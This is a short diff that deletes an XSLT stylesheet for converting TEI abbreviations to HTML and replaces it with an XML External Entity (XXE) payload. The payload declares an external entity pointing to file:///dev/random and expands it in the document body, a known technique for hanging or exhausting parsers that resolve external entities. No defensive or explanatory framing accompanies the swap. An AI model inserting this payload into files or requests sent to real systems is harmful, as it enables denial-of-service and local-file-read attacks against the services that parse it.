@@ -1,16 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:transform
-    version="1.0"
-    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-    xmlns="http://www.w3.org/1999/xhtml"
-    xmlns:tei="http://www.tei-c.org/ns/1.0"
->
-    <!-- Transformation XSLT (instructions XML avec le préfixe “xsl:”) qui prend
-en entrée du TEI (noms avec préfixe “tei:”) et donne en sortie du HTML (noms
-sans préfixe). -->
-    <xsl:template match="tei:abbr">
-        <abbr>
-            <xsl:apply-templates/>
-        </abbr>
-    </xsl:template>
-</xsl:transform>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
